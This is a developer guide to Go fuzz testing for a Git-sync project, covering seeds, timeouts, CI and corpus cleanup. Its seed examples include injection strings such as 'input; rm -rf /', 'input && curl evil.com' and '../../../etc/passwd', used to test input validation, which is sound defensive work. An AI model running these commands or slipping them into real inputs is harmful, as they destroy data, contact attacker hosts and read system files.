# Fuzz Testing Guide

## Overview

This project uses Go's native fuzzing (Go 1.18+) for security testing. Fuzz tests automatically generate and test a wide variety of inputs to discover edge cases, panics, and potential security vulnerabilities.

## Running Fuzz Tests Locally

### Run all fuzz tests briefly (5s each)

```bash
magex test:fuzz time=5s
```

### Run specific fuzz test

```bash
# Run a specific fuzz test for 30 seconds
go test -fuzz=FuzzGitURLSafety -fuzztime=30s ./internal/git

# Run with verbose output
go test -v -fuzz=FuzzConfigParsing -fuzztime=1m ./internal/config
```

### Clean accumulated corpus

```bash
# Clean all fuzz cache (recommended before CI-like testing)
go clean -fuzzcache

# Inspect fuzz corpus location
go env GOCACHE
```

## Best Practices

### Seed Selection

**Keep 12-20 seeds per fuzz function** (maximum)

The goal is quality over quantity. Each seed should represent a unique attack vector or edge case:

- **Prioritize unique attack vectors over variations**
  - ✅ One seed for command injection with `;`
  - ✅ One seed for command injection with `&&`
  - ❌ Five seeds with minor variations of the same attack

- **One seed per vulnerability class**
  - Path traversal: `../../../etc/passwd`
  - Command injection: `input; rm -rf /`
  - Null byte injection: `input\x00`
  - Special characters: `input\n\r`

- **Include 2-3 valid baseline cases**
  - Valid URLs, file paths, branch names, etc.
  - Ensures legitimate inputs don't trigger false positives

- **Include 2-3 edge cases**
  - Empty strings: `""`
  - Very long inputs: `strings.Repeat("a", 1000)`
  - Special values: whitespace-only, null bytes, unicode

### Timeout Configuration

Set appropriate timeouts based on operation complexity:

| Operation Type | Timeout | Example |
|----------------|---------|---------|
| Simple validation | 1000-1500ms | URL validation, string checks |
| Complex parsing (YAML, regex) | 2000-3000ms | Config file parsing, template expansion |
| JSON parsing | 2000ms | GitHub API response parsing |

**Example:**

```go
ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
defer cancel()
```

### Input Size Limits

Match expected real-world usage to prevent unrealistic test cases:

| Input Type | Size Limit | Rationale |
|------------|------------|-----------|
| URLs | 300 bytes | Practical Git URL lengths |
| File paths | 500 bytes | Typical filesystem path limits |
| Branch names | 150 bytes | Git ref name conventions |
| Commit messages | 1000 bytes | Standard commit message length |
| Config files | 5000 bytes | Reasonable YAML config size |
| JSON responses | 3000 bytes | Typical API response size |

**Example:**

```go
if len(input) > 300 {
    t.Skipf("Input too large: %d bytes (limit: 300)", len(input))
}
```

### CI Integration

**Run brief fuzz tests in CI** (baseline validation only):

```bash
# Use time=5s for CI to validate seed corpus
magex test:fuzz time=5s
```

**Clean fuzz cache before tests:**

```yaml
- name: Clean fuzz cache
  run: go clean -fuzzcache
```

**Set reasonable test timeout:**

```yaml
timeout-minutes: 15  # Total workflow timeout
```

**Environment variables:**

```bash
FUZZ_TIMEOUT="${TEST_TIMEOUT_FUZZ:-5m}"  # Individual fuzz test timeout
```

## Corpus Management

### Understanding Fuzz Corpus

Go stores discovered fuzz inputs in `$GOCACHE/fuzz/<package>/<FuzzFunc>/`:

- **In-code seeds**: Defined in your test file via `f.Add()`
- **Discovered corpus**: Automatically stored by Go when fuzzing finds interesting inputs
- **Persistent across runs**: Corpus accumulates over time (can cause CI timeouts)

### Inspect Corpus

```bash
# View corpus location for a specific fuzz test
ls -lh $(go env GOCACHE)/fuzz/github.com/mrz1836/go-broadcast/internal/git/FuzzGitURLSafety/

# Count corpus entries
find $(go env GOCACHE)/fuzz -type f -name '*' | wc -l
```

### Reset Specific Test Corpus

```bash
# Remove corpus for specific fuzz test
rm -rf $(go env GOCACHE)/fuzz/github.com/mrz1836/go-broadcast/internal/git/FuzzGitURLSafety/

# Clean all fuzz cache
go clean -fuzzcache
```

### CI Corpus Cleanup

The CI workflow automatically cleans the fuzz cache before each run to ensure:

- ✅ Consistent baseline validation time
- ✅ No accumulated corpus from previous runs
- ✅ Predictable test duration

## Security Test Coverage

All fuzz tests validate against common attack vectors:

### Universal Security Checks

- ✅ **Command injection**: `;`, `&&`, `|`, `` ` ``, `$()`
- ✅ **Path traversal**: `../`, `file://`, `/etc/`, `~`, `$HOME`
- ✅ **Null byte injection**: `\x00`
- ✅ **Special characters**: `\n`, `\r`, `\t`, quotes
- ✅ **Edge cases**: empty, very long, whitespace

### Package-Specific Coverage

**git package** (`internal/git`):
- Git-specific patterns: `.git`, refs, branch syntax
- Git special characters: `~1`, `..`, `^`, `@{upstream}`
- Leading dashes that could be interpreted as flags

**transform package** (`internal/transform`):
- Template variable expansion attacks
- Regular expression ReDoS (catastrophic backtracking)
- Binary data detection edge cases

**gh package** (`internal/gh`):
- GitHub API JSON parsing
- CLI argument injection
- Error message sanitization

**config package** (`internal/config`):
- YAML parsing vulnerabilities
- Anchor/alias bomb attacks
- Deeply nested structure handling

**errors package** (`internal/errors`):
- Error message sanitization
- Stack trace safety

## Package Overview

### Current Fuzz Test Statistics

| Package | Functions | Seeds | Timeout | Status |
|---------|-----------|-------|---------|--------|
| `internal/git` | 5 | 72 | 1500ms | ✅ Optimized |
| `internal/gh` | 3 | 85 | 1500-2000ms | ✅ Optimized |
| `internal/transform` | 4 | 82 | 800-2000ms | ✅ Already optimal |
| `internal/config` | 3 | 30 | 3000ms | ✅ Already optimal |
| `internal/errors` | Many | 72 | 1000ms | ✅ Already optimal |

### Git Package Functions

- `FuzzGitURLSafety` - Validates Git URLs for command injection and path traversal
- `FuzzGitFilePath` - Tests file path security (traversal, injection, special chars)
- `FuzzGitBranchName` - Validates branch names against Git and security constraints
- `FuzzGitCommitMessage` - Tests commit message handling
- `FuzzGitRepoPath` - Validates repository path security

### GH Package Functions

- `FuzzGitHubCLIArgs` - Tests GitHub CLI argument construction
- `FuzzJSONParsing` - Validates GitHub API response parsing
- `FuzzErrorHandling` - Tests error message sanitization

### Transform Package Functions

- `FuzzTemplateVariableReplacement` - Template expansion security
- `FuzzRegexReplacement` - Regular expression ReDoS protection
- `FuzzTransformChain` - Multiple transform operations
- `FuzzBinaryDetection` - Binary data detection edge cases

### Config Package Functions

- `FuzzConfigParsing` - YAML parsing security
- `FuzzVariableExpansion` - Variable substitution attacks
- `FuzzTemplateRendering` - Template rendering vulnerabilities

## Troubleshooting

### Fuzz Test Timeouts

**Symptom**: Tests fail with "context deadline exceeded"

**Solutions**:

1. **Clean fuzz cache**:
   ```bash
   go clean -fuzzcache
   ```

2. **Reduce seed count**: Aim for 12-20 seeds per function

3. **Increase timeout** (if operations are legitimately slow):
   ```go
   ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
   ```

4. **Add size limits** to skip unrealistic inputs:
   ```go
   if len(input) > 1000 {
       t.Skipf("Input too large: %d bytes", len(input))
   }
   ```

### Fuzz Test Failures

**Symptom**: Fuzz test discovers a crash or failure

**Investigation**:

1. **Review the failing input** from the test output
2. **Reproduce locally**:
   ```bash
   go test -v -run=FuzzName/seed#123 ./package
   ```
3. **Add as regression test** if it reveals a real bug
4. **Update validation logic** if it's a legitimate edge case

### CI-Specific Issues

**Symptom**: Tests pass locally but fail in CI

**Common causes**:

- Accumulated fuzz corpus in CI cache → Solution: Ensure `go clean -fuzzcache` in CI
- Different Go version → Solution: Match CI Go version locally
- Timing-dependent tests → Solution: Use consistent timeouts

## Performance Optimization

### Measuring Fuzz Performance

```bash
# Run with timing information
time go test -fuzz=FuzzGitURLSafety -fuzztime=10s ./internal/git

# Check baseline validation time
go test -v -run=FuzzGitURLSafety/seed ./internal/git 2>&1 | grep -E "^=== RUN|^--- PASS"
```

### Optimization Tips

1. **Reduce seed count** - Each seed adds baseline validation time
2. **Skip expensive operations** for unrealistic inputs
3. **Use size limits** to prevent processing oversized inputs
4. **Optimize validation logic** - Use efficient string operations
5. **Cache expensive checks** when possible

### Expected Performance

With optimized seed counts:

| Package | Baseline Time | Fuzz Time (5s) | Total |
|---------|---------------|----------------|-------|
| git | ~108s (72 seeds × 1.5s) | 5s × 5 = 25s | ~133s |
| gh | ~128s (85 seeds × 1.5s) | 5s × 3 = 15s | ~143s |
| transform | ~164s (82 seeds × 2s) | 5s × 4 = 20s | ~184s |
| config | ~90s (30 seeds × 3s) | 5s × 3 = 15s | ~105s |
| **Total** | ~490s | ~75s | **~565s** |

CI timeout: 15 minutes (900s) - leaves comfortable margin.

## Examples

### Example 1: Adding a New Fuzz Test

```go
func FuzzNewFeature(f *testing.F) {
    // Add 12-15 high-value seeds
    seeds := []string{
        // Valid cases (2-3)
        "valid-input-1",
        "valid-input-2",

        // Command injection (3-5)
        "input; rm -rf /",
        "input && curl evil.com",
        "input`whoami`",

        // Path traversal (2-3)
        "../../../etc/passwd",
        "file:///etc/passwd",

        // Special characters (2-3)
        "input\x00",
        "input\n",

        // Edge cases (2)
        "",
        strings.Repeat("a", 1000),
    }

    for _, seed := range seeds {
        f.Add(seed)
    }

    f.Fuzz(func(t *testing.T, input string) {
        // Size limit
        if len(input) > 500 {
            t.Skipf("Input too large: %d bytes", len(input))
        }

        // Timeout
        ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
        defer cancel()

        // Panic recovery
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic: %v, input: %q", r, input)
            }
        }()

        // Test your function
        result, err := YourFunction(ctx, input)

        // Validate security
        if containsShellMetachars(result) {
            t.Logf("Security: Shell metacharacters in result: %q", result)
        }
    })
}
```

### Example 2: Optimizing Existing Fuzz Test

**Before** (too many seeds):

```go
seeds := []string{
    // 50+ seeds including many variations of the same attack
    "input; rm -rf /",
    "input; rm -rf /tmp",
    "input; rm -rf /home",
    // ... 10 more similar command injection variants
}
```

**After** (optimized):

```go
seeds := []string{
    // 15 seeds covering all unique attack vectors
    "input; rm -rf /",  // Command injection with semicolon
    "input && curl evil.com",  // Command injection with &&
    // ... other unique patterns
}
```

## Additional Resources

- [Go Fuzzing Documentation](https://go.dev/doc/fuzz/)
- [Go Security Best Practices](https://golang.org/doc/security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

## Maintenance

This document should be updated when:

- ✅ Adding new fuzz test packages
- ✅ Changing timeout or size limit recommendations
- ✅ Discovering new attack vectors to test
- ✅ Optimizing fuzz test performance
- ✅ CI fuzz test configuration changes
